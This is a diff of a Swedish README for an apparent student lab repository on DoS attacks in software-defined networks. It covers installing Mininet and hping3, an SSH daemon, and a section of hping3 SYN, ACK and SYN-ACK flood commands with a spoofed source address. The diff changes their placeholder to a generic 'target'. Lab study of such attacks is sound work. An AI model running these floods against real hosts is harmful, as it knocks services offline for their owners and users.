@@ -1,43 +1,43 @@
 # SYN-FLOOD-DOS-ATTACKER-I-SDN
-Detta reposetory är en guide till installationen av mininet och dokumentation av olika attack typer.
+Den här samlingen av dokument innehåller en guide till hur Mininet och Hping3 installeras. Dokumentationen innehåller även attack-kommandon och SSH.
 
-## Installation av mininet i UBUNTU
+## Installation av Mininet i UBUNTU
 
-Först installera vi mininet genom sudo `apt-get install mininet`.
+Börja med att installera Mininet med följande kommando `sudo apt-get install mininet`.
 
-Sedan ladda vi ner github `sudo apt-get install git`.
+Installera git kommandot `sudo apt-get install git`.
 
-Vi clona mininet github `git clone git://github.com/mininet/mininet`.
+För att installera Mininet från källkoden behöver du installera källkoden `git clone git://github.com/mininet/mininet`.
 
-I mininet hitta `git tag`.
+I Mininet hitta `git tag` och sedan Kopiera tag.
 
-Kopiera tag.
+Skapa en ny gren med tagen du kopierade `git checkout -b "tag"`.
 
-Skapa en ny gren `git checkout -b "tag"`.
+Ladda ned verktyg för Mininet `mininet/util/install.sh -a`.
 
-Ladda ned python och andra verktyg för mininet `mininet/util/install.sh -a`.
+Lägg till din linux distribution, den finns på toppen när du laddar ned `mininet/util/install.sh -a "din linux distribution"`.
 
-Lägg till din linux distributiuon, den finns på topen när du ladar ner `mininet/util/install.sh -a "din linux distributiuon"`.
+## Starta Mininet
 
-## Starta mininet
+För att starta en simpel Mininet topologi skriver du `sudo mn` det skapar en Mininet topologi med en kontroller, switch och två host. Använd våra Python skript för att skapa våra topologier.
 
-För att starta en simpel mininet skriver du `sudo mn` det ger den en kontroller en switch och två host.
+## stäng Mininet
 
-För att köra vår typ kör en av våra python skripter.
+Stäng mininet genom `sudo mn -c`
 
 ## Installation av hping3
 
-Ladda ner hping3 med `sudo apt-get install hping3`
+Ladda ned Hping3 med `sudo apt-get install hping3`
 
-## hping3 attack-kommandon
+## Hping3 attack-kommandon
 
-SYN-flood attack `hping3 "host2 ip-address" --syn --flood -a 10.0.0.13`.
+SYN-flood attack `hping3 "target ip-address" --syn --flood -a 10.0.0.13`.
 
-ACK-flood attack `hping3 "host2 ip-address" --ack --flood -a 10.0.0.13`
+ACK-flood attack `hping3 "target ip-address" --ack --flood -a 10.0.0.13`
 
-SYN-ACK-flood attack `hping3 "host2 ip-address" --syn --ack --flood -a 10.0.0.13`
+SYN-ACK-flood attack `hping3 "target ip-address" --syn --ack --flood -a 10.0.0.13`
 
 ## SSH daemon
-För att köra en ssh på en host skriver du `sudo ~/mininet/examples/sshd.py`.
+För att kunna köra ssh till Mininet skriver du `sudo ~/mininet/examples/sshd.py`.
 
-Nu kan du ssh från en annan terminal till en host `ssh "IP-adress"`
+Nu kan du ssh från en annan terminal till en host `ssh "host IP-adress"`
